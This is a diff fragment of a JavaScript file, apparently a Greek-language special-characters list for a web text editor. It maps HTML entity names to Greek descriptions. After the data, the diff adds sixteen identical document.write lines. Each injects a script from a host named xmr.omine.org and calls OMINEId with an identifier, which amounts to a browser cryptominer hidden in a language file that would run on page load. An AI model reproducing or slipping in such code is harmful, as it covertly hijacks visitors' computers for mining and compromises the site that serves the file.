@@ -11,3 +11,19 @@ aacute:"Λατινικό μικρό γράμμα a με οξεία",acirc:"Λα�
 iacute:"Λατινικό μικρό γράμμα i με οξεία",icirc:"Λατινικό μικρό γράμμα i με περισπωμένη",iuml:"Λατινικό μικρό γράμμα i με διαλυτικά",eth:"Λατινικό μικρό γράμμα eth",ntilde:"Λατινικό μικρό γράμμα n με περισπωμένη",ograve:"Λατινικό μικρό γράμμα o με βαρεία",oacute:"Λατινικό μικρό γράμμα o με οξεία ",ocirc:"Λατινικό πεζό γράμμα o με περισπωμένη",otilde:"Λατινικό μικρό γράμμα o με περισπωμένη ",ouml:"Λατινικό μικρό γράμμα o με διαλυτικά",divide:"Σύμβολο διαίρεσης",oslash:"Λατινικό μικρό γράμμα o με περισπωμένη",
 ugrave:"Λατινικό μικρό γράμμα u με βαρεία",uacute:"Λατινικό μικρό γράμμα u με οξεία",ucirc:"Λατινικό μικρό γράμμα u με περισπωμένη",uuml:"Λατινικό μικρό γράμμα u με διαλυτικά",yacute:"Λατινικό μικρό γράμμα y με οξεία",thorn:"Λατινικό μικρό γράμμα thorn",yuml:"Λατινικό μικρό γράμμα y με διαλυτικά",OElig:"Λατινικό κεφαλαίο σύμπλεγμα ΟΕ",oelig:"Λατινικό μικρό σύμπλεγμα oe",372:"Λατινικό κεφαλαίο γράμμα W με περισπωμένη",374:"Λατινικό κεφαλαίο γράμμα Y με περισπωμένη",373:"Λατινικό μικρό γράμμα w με περισπωμένη",
 375:"Λατινικό μικρό γράμμα y με περισπωμένη",sbquo:"Single low-9 quotation mark",8219:"Single high-reversed-9 quotation mark",bdquo:"Double low-9 quotation mark",hellip:"Οριζόντια αποσιωπητικά",trade:"Σύμβολο εμπορικού κατατεθέν",9658:"Μαύρος δείκτης που δείχνει προς τα δεξιά",bull:"Κουκκίδα",rarr:"Δεξί βελάκι",rArr:"Διπλό δεξί βελάκι",hArr:"Διπλό βελάκι αριστερά-δεξιά",diams:"Μαύρο διαμάντι",asymp:"Σχεδόν ίσο με"});
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
